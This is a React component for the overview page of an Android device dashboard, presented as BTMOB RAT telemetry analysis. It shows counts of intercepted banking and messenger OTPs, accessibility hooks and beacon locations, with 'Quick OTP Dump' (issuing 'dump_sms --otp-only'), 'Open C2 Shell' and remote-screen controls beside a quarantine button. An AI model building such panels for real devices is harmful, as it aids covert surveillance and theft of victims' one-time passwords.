import React from 'react';
import { useDashboard } from '../../context/DashboardContext';
import { 
  Smartphone, 
  ShieldAlert, 
  KeyRound, 
  Radio, 
  AlertTriangle, 
  Terminal, 
  ExternalLink,
  ChevronRight,
  ShieldCheck,
  Send,
  Lock,
  BatteryMedium
} from 'lucide-react';
import { t } from '../../utils/translations';

export const OverviewView: React.FC = () => {
  const { 
    lang, 
    devices, 
    smsList, 
    threatEvents, 
    setActiveTab, 
    setSelectedDeviceId,
    setSelectedInspectDevice,
    quarantineDevice,
    executeCommand
  } = useDashboard();

  const labels = t[lang];

  // Core telemetry metrics
  const totalCount = devices.length;
  const onlineCount = devices.filter(d => d.status === 'online').length;
  const activeInfections = devices.filter(d => d.btmobInfectionStatus === 'active').length;
  const otpCount = smsList.filter(s => s.isOtp).length;
  const accessibilityAbuseCount = devices.filter(d => d.accessibilityEnabled).length;

  return (
    <div className="space-y-6">
      {/* Page Title & Context Bar */}
      <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-3 border-b border-slate-800/60 pb-4">
        <div>
          <h1 className="text-xl font-bold tracking-tight text-white">
            {labels.navOverview}
          </h1>
          <div className="flex items-center gap-2 text-xs text-slate-400 mt-1">
            <span>{lang === 'fa' ? 'پایش لحظه‌ای ناوگان اندروید و تروجان BTMOB' : 'Real-Time Android Fleet Telemetry & BTMOB RAT Analysis'}</span>
            <span aria-hidden="true">·</span>
            <span className="font-mono text-cyan-400">{onlineCount} {lang === 'fa' ? 'دستگاه آنلاین' : 'Active Online'}</span>
          </div>
        </div>

        <div className="flex items-center gap-2">
          <button
            onClick={() => {
              executeCommand('dump_sms --otp-only');
              setActiveTab('sms-calls');
            }}
            className="px-3 py-1.5 bg-slate-900 hover:bg-slate-800 border border-slate-800 text-slate-200 text-xs rounded-lg transition-colors cursor-pointer flex items-center gap-1.5"
          >
            <KeyRound className="w-3.5 h-3.5 text-cyan-400" />
            <span>{lang === 'fa' ? 'استخراج فوری OTPها' : 'Quick OTP Dump'}</span>
          </button>
          <button
            onClick={() => setActiveTab('terminal')}
            className="px-3 py-1.5 bg-cyan-600 hover:bg-cyan-500 text-slate-950 font-semibold text-xs rounded-lg transition-colors cursor-pointer flex items-center gap-1.5"
          >
            <Terminal className="w-3.5 h-3.5" />
            <span>{lang === 'fa' ? 'ترمینال C2' : 'Open C2 Shell'}</span>
          </button>
        </div>
      </div>

      {/* Metrics Row (4 Columns with Tabular Figures) */}
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
        {/* Metric 1 */}
        <div className="p-4 rounded-xl bg-slate-900/60 border border-slate-800/80">
          <div className="flex items-center justify-between text-xs text-slate-400 mb-2">
            <span>{labels.totalDevices}</span>
            <Smartphone className="w-4 h-4 text-cyan-400" />
          </div>
          <div className="flex items-baseline gap-2">
            <span className="text-2xl font-bold font-mono tabular-nums text-white">
              {onlineCount}
            </span>
            <span className="text-xs text-slate-500 font-mono">
              / {totalCount} {lang === 'fa' ? 'دستگاه ثبت‌شده' : 'registered'}
            </span>
          </div>
          <div className="mt-2 text-[11px] text-slate-400">
            <span>{devices.filter(d => d.status === 'quarantined').length} {lang === 'fa' ? 'دستگاه در قرنطینه' : 'in quarantine'}</span>
          </div>
        </div>

        {/* Metric 2 */}
        <div className="p-4 rounded-xl bg-slate-900/60 border border-slate-800/80">
          <div className="flex items-center justify-between text-xs text-slate-400 mb-2">
            <span>{labels.activeInfections}</span>
            <ShieldAlert className="w-4 h-4 text-rose-400" />
          </div>
          <div className="flex items-baseline gap-2">
            <span className="text-2xl font-bold font-mono tabular-nums text-rose-400">
              {activeInfections}
            </span>
            <span className="text-xs text-rose-500/80 font-medium">
              {lang === 'fa' ? 'هشدار خطر بالا' : 'High Threat'}
            </span>
          </div>
          <div className="mt-2 text-[11px] text-slate-400">
            <span>{lang === 'fa' ? 'حملات Overlay و سوءاستفاده دسترسی' : 'Active overlay & stealth hooks'}</span>
          </div>
        </div>

        {/* Metric 3 */}
        <div className="p-4 rounded-xl bg-slate-900/60 border border-slate-800/80">
          <div className="flex items-center justify-between text-xs text-slate-400 mb-2">
            <span>{labels.interceptedOtps}</span>
            <KeyRound className="w-4 h-4 text-amber-400" />
          </div>
          <div className="flex items-baseline gap-2">
            <span className="text-2xl font-bold font-mono tabular-nums text-amber-400">
              {otpCount}
            </span>
            <span className="text-xs text-slate-500 font-mono">
              {lang === 'fa' ? 'رمز پویای فعال' : 'Active OTPs'}
            </span>
          </div>
          <div className="mt-2 text-[11px] text-slate-400">
            <span>{lang === 'fa' ? 'همراه بانک‌ها و تلگرام/بله' : 'Banking & Instant Messengers'}</span>
          </div>
        </div>

        {/* Metric 4 */}
        <div className="p-4 rounded-xl bg-slate-900/60 border border-slate-800/80">
          <div className="flex items-center justify-between text-xs text-slate-400 mb-2">
            <span>{labels.accessibilityAbuseCount}</span>
            <Radio className="w-4 h-4 text-cyan-400" />
          </div>
          <div className="flex items-baseline gap-2">
            <span className="text-2xl font-bold font-mono tabular-nums text-cyan-400">
              {accessibilityAbuseCount}
            </span>
            <span className="text-xs text-slate-500 font-mono">
              {lang === 'fa' ? 'سرویس فعال' : 'Active hooks'}
            </span>
          </div>
          <div className="mt-2 text-[11px] text-slate-400">
            <span>{lang === 'fa' ? 'دسترسی کامل خواندن صفحه و کلیدها' : 'Full view hierarchy & keystrokes'}</span>
          </div>
        </div>
      </div>

      {/* Main Two-Column View: Map & Active Endpoints | Live Security Event Stream */}
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        {/* Left/Main Column: Geolocation Radar & Monitored Devices Preview */}
        <div className="lg:col-span-2 space-y-6">
          {/* Geolocation Visualization */}
          <div className="rounded-xl bg-slate-900/60 border border-slate-800/80 p-5">
            <div className="flex items-center justify-between mb-4">
              <div>
                <h3 className="text-sm font-semibold text-white">
                  {lang === 'fa' ? 'پراکندگی جغرافیایی دستگاه‌ها و ارتباط با C2' : 'Device Geolocation & C2 Beacon Distribution'}
                </h3>
                <p className="text-xs text-slate-400 mt-0.5">
                  {lang === 'fa' ? 'نمای زنده نقاط ارتباطی و آی‌پی دستگاه‌های تحت پایش' : 'Live beacon coordinates and originating IP gateways'}
                </p>
              </div>
              <div className="flex items-center gap-3 text-xs text-slate-400 font-mono">
                <span className="flex items-center gap-1">
                  <span className="w-2 h-2 rounded-full bg-emerald-400" />
                  {lang === 'fa' ? 'فعال' : 'Active'}
                </span>
                <span className="flex items-center gap-1">
                  <span className="w-2 h-2 rounded-full bg-amber-400" />
                  {lang === 'fa' ? 'قرنطینه' : 'Quarantined'}
                </span>
              </div>
            </div>

            {/* Stylized Cyber Map Simulation */}
            <div className="relative h-56 rounded-lg bg-slate-950 border border-slate-800/80 overflow-hidden flex items-center justify-center p-4">
              {/* Subtle grid pattern */}
              <div className="absolute inset-0 bg-[linear-gradient(to_right,#1e293b15_1px,transparent_1px),linear-gradient(to_bottom,#1e293b15_1px,transparent_1px)] bg-[size:24px_24px]" />
              
              {/* Regional radar circles */}
              <div className="absolute w-72 h-72 rounded-full border border-cyan-500/10 pointer-events-none" />
              <div className="absolute w-44 h-44 rounded-full border border-cyan-500/15 pointer-events-none" />

              {/* Render Device Nodes */}
              <div className="relative w-full h-full">
                {devices.map((device, idx) => {
                  // Normalize coordinates to percentage inside the box for visual radar
                  // latitude roughly [-30 to 55] -> Y: 10% to 90%
                  // longitude roughly [-50 to 60] -> X: 10% to 90%
                  const leftPercent = Math.min(Math.max(((device.longitude + 60) / 130) * 100, 8), 92);
                  const topPercent = Math.min(Math.max(((60 - device.latitude) / 100) * 100, 8), 92);

                  return (
                    <div
                      key={device.id}
                      style={{ left: `${leftPercent}%`, top: `${topPercent}%` }}
                      className="absolute -translate-x-1/2 -translate-y-1/2 group cursor-pointer"
                      onClick={() => setSelectedInspectDevice(device)}
                    >
                      <div className="relative flex items-center justify-center">
                        <span className={`w-3.5 h-3.5 rounded-full ${device.status === 'online' ? 'bg-cyan-500/30 ring-2 ring-cyan-400' : 'bg-amber-500/30 ring-2 ring-amber-400'} animate-ping absolute`} />
                        <span className={`w-2.5 h-2.5 rounded-full ${device.status === 'online' ? 'bg-cyan-400' : 'bg-amber-400'} relative`} />
                      </div>
                      
                      {/* Tooltip on hover */}
                      <div className="hidden group-hover:block absolute bottom-full mb-1 left-1/2 -translate-x-1/2 z-20 whitespace-nowrap bg-slate-900 border border-slate-700 px-2 py-1 rounded text-[11px] text-white shadow-xl pointer-events-none">
                        <div className="font-semibold">{device.name}</div>
                        <div className="text-[10px] text-slate-400 font-mono">{device.city}, {device.country} · {device.ip}</div>
                      </div>
                    </div>
                  );
                })}
              </div>

              {/* Map Footer Info */}
              <div className="absolute bottom-2 start-3 text-[10px] font-mono text-slate-500">
                GEO-GRID: LAT/LNG WGS84 · BEACON INTERVAL: 30s
              </div>
            </div>
          </div>

          {/* Quick Endpoints Table */}
          <div className="rounded-xl bg-slate-900/60 border border-slate-800/80 p-5">
            <div className="flex items-center justify-between mb-4">
              <div>
                <h3 className="text-sm font-semibold text-white">
                  {lang === 'fa' ? 'دستگاه‌های تحت کنترل و پایش فعال' : 'Active Monitored Endpoints'}
                </h3>
                <p className="text-xs text-slate-400 mt-0.5">
                  {lang === 'fa' ? 'وضعیت زنده سخت‌افزار، برنامه فعال و دسترسی‌های حساس' : 'Real-time foreground app and privilege state'}
                </p>
              </div>
              <button
                onClick={() => setActiveTab('devices')}
                className="text-xs text-cyan-400 hover:text-cyan-300 flex items-center gap-1 font-medium cursor-pointer"
              >
                <span>{lang === 'fa' ? 'مشاهده همه دستگاه‌ها' : 'View all devices'}</span>
                <ChevronRight className={`w-3.5 h-3.5 ${lang === 'fa' ? 'rotate-180' : ''}`} />
              </button>
            </div>

            <div className="overflow-x-auto">
              <table className="w-full text-xs text-start">
                <thead>
                  <tr className="border-b border-slate-800 text-slate-400 text-[11px]">
                    <th className="py-2.5 px-3 font-medium text-start">{lang === 'fa' ? 'مدل دستگاه' : 'Device Model'}</th>
                    <th className="py-2.5 px-3 font-medium text-start">{lang === 'fa' ? 'وضعیت اتصال' : 'Status'}</th>
                    <th className="py-2.5 px-3 font-medium text-start">{lang === 'fa' ? 'برنامه فعال' : 'Foreground App'}</th>
                    <th className="py-2.5 px-3 font-medium text-start">{lang === 'fa' ? 'سوءاستفاده Accessibility' : 'Accessibility Hook'}</th>
                    <th className="py-2.5 px-3 font-medium text-end">{lang === 'fa' ? 'عملیات سریع' : 'Quick Actions'}</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-slate-800/50">
                  {devices.slice(0, 4).map((d) => (
                    <tr key={d.id} className="hover:bg-slate-800/30 transition-colors">
                      <td className="py-2.5 px-3">
                        <div className="font-medium text-slate-200">{d.name}</div>
                        <div className="text-[10px] text-slate-400 font-mono">{d.id} · {d.carrier}</div>
                      </td>
                      <td className="py-2.5 px-3">
                        <span className={`inline-flex items-center gap-1 text-[11px] font-mono capitalize ${
                          d.status === 'online' ? 'text-emerald-400' : d.status === 'quarantined' ? 'text-amber-400' : 'text-slate-400'
                        }`}>
                          <span className={`w-1.5 h-1.5 rounded-full ${d.status === 'online' ? 'bg-emerald-400' : d.status === 'quarantined' ? 'bg-amber-400' : 'bg-slate-500'}`} />
                          {d.status}
                        </span>
                      </td>
                      <td className="py-2.5 px-3 text-cyan-300 font-medium">
                        {d.currentApp}
                      </td>
                      <td className="py-2.5 px-3">
                        {d.accessibilityEnabled ? (
                          <span className="text-rose-400 font-mono text-[11px] flex items-center gap-1">
                            <AlertTriangle className="w-3 h-3" />
                            HOOK_ACTIVE
                          </span>
                        ) : (
                          <span className="text-slate-400 font-mono text-[11px]">
                            DISABLED
                          </span>
                        )}
                      </td>
                      <td className="py-2.5 px-3 text-end">
                        <div className="flex items-center justify-end gap-1.5">
                          <button
                            onClick={() => {
                              setSelectedDeviceId(d.id);
                              setActiveTab('remote-screen');
                            }}
                            className="p-1.5 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 hover:text-white transition-colors cursor-pointer"
                            title={lang === 'fa' ? 'کنترل ریموت' : 'Remote screen'}
                          >
                            <ExternalLink className="w-3.5 h-3.5" />
                          </button>
                          <button
                            onClick={() => setSelectedInspectDevice(d)}
                            className="px-2 py-1 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 hover:text-white text-[11px] transition-colors cursor-pointer"
                          >
                            {lang === 'fa' ? 'جزئیات' : 'Inspect'}
                          </button>
                        </div>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </div>
        </div>

        {/* Right Column: Live Security Event Stream & Incident Controls */}
        <div className="space-y-6">
          {/* Live Event Stream */}
          <div className="rounded-xl bg-slate-900/60 border border-slate-800/80 p-5">
            <div className="flex items-center justify-between mb-4">
              <div>
                <h3 className="text-sm font-semibold text-white">
                  {labels.lastEventStream}
                </h3>
                <p className="text-xs text-slate-400 mt-0.5">
                  {lang === 'fa' ? 'لاگ زنده فعالیت تروجان BTMOB' : 'Live BTMOB telemetry stream'}
                </p>
              </div>
              <div className="w-2 h-2 rounded-full bg-emerald-400 animate-ping" />
            </div>

            <div className="space-y-3 max-h-[380px] overflow-y-auto pr-1">
              {threatEvents.map((evt) => {
                const isCritical = evt.severity === 'critical';
                const isHigh = evt.severity === 'high';
                const isInfo = evt.severity === 'info';

                return (
                  <div
                    key={evt.id}
                    className={`p-3 rounded-lg border transition-all ${
                      isCritical
                        ? 'bg-rose-950/20 border-rose-800/50 text-rose-200'
                        : isHigh
                        ? 'bg-amber-950/20 border-amber-800/50 text-amber-200'
                        : 'bg-slate-950 border-slate-800 text-slate-300'
                    }`}
                  >
                    <div className="flex items-center justify-between text-[11px] mb-1">
                      <span className="font-semibold flex items-center gap-1.5">
                        {isCritical ? (
                          <AlertTriangle className="w-3.5 h-3.5 text-rose-400 shrink-0" />
                        ) : isHigh ? (
                          <KeyRound className="w-3.5 h-3.5 text-amber-400 shrink-0" />
                        ) : (
                          <ShieldCheck className="w-3.5 h-3.5 text-emerald-400 shrink-0" />
                        )}
                        <span>{evt.title}</span>
                      </span>
                      <span className="font-mono text-[10px] text-slate-400">
                        {evt.timestamp}
                      </span>
                    </div>

                    <p className="text-xs text-slate-300/90 leading-relaxed mb-2">
                      {evt.description}
                    </p>

                    <div className="flex items-center justify-between text-[10px] text-slate-400 font-mono pt-1 border-t border-slate-800/40">
                      <span>{evt.deviceName}</span>
                      <span className="text-cyan-400/80">{evt.tag}</span>
                    </div>
                  </div>
                );
              })}
            </div>
          </div>

          {/* Quick Threat Mitigation Card */}
          <div className="rounded-xl bg-gradient-to-br from-slate-900/90 to-slate-950 border border-slate-800 p-5">
            <h4 className="text-xs font-semibold text-slate-300 uppercase tracking-wider mb-2 flex items-center gap-1.5">
              <ShieldCheck className="w-4 h-4 text-emerald-400" />
              <span>{lang === 'fa' ? 'دستورالعمل مقابله اضطراری' : 'Active Mitigation Protocol'}</span>
            </h4>
            <p className="text-xs text-slate-400 leading-relaxed mb-4">
              {lang === 'fa'
                ? 'در صورت شناسایی تزریق Overlay روی همراه بانک‌ها یا سرقت رمز پویا، می‌توانید با یک کلیک قلاب‌های Accessibility را غیرفعال کرده و دستگاه را قرنطینه نمایید.'
                : 'Neutralize BTMOB persistence hooks by revoking Accessibility Services and locking active foreground sessions.'}
            </p>

            <button
              onClick={() => {
                devices.forEach(d => {
                  if (d.btmobInfectionStatus === 'active') {
                    quarantineDevice(d.id);
                  }
                });
              }}
              className="w-full py-2 px-3 rounded-lg bg-rose-700/80 hover:bg-rose-600 text-white font-semibold text-xs transition-colors cursor-pointer flex items-center justify-center gap-2 shadow-lg shadow-rose-950/50"
            >
              <AlertTriangle className="w-4 h-4" />
              <span>{labels.quarantineAll}</span>
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};
